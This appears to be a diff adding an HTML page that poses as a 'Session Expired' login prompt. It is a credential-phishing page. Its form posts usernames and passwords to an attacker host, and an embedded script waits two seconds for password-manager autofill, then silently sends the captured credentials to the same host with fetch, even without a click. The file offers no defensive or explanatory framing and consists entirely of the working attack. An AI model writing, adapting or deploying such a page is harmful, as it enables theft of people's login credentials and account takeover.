@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        body { font-family: sans-serif; padding: 20px; }
+        input { display: block; margin-bottom: 10px; width: 100%; padding: 8px; }
+        button { width: 100%; padding: 10px; background: #007bff; color: white; border: none; }
+    </style>
+</head>
+<body>
+    <h3>Session Expired - Please Login</h3>
+    <form action="https://attacker-server.com/collect" method="POST">
+        <label>Username</label>
+        <input type="text" name="username" id="username" autocomplete="username" placeholder="Email or Username">
+        
+        <label>Password</label>
+        <input type="password" name="password" id="password" autocomplete="current-password" placeholder="Password">
+        
+        <button type="submit">Sign In</button>
+    </form>
+
+    <script>
+        // Optional: Silent exfiltration
+        // Some managers autofill instantly. This script waits 2 seconds 
+        // and sends the values to you even if they don't click 'Submit'.
+        setTimeout(() => {
+            const u = document.getElementById('username').value;
+            const p = document.getElementById('password').value;
+            if(u && p) {
+                fetch(`https://attacker-server.com/log?u=${u}&p=${p}`);
+            }
+        }, 2000);
+    </script>
+</body>
+</html>
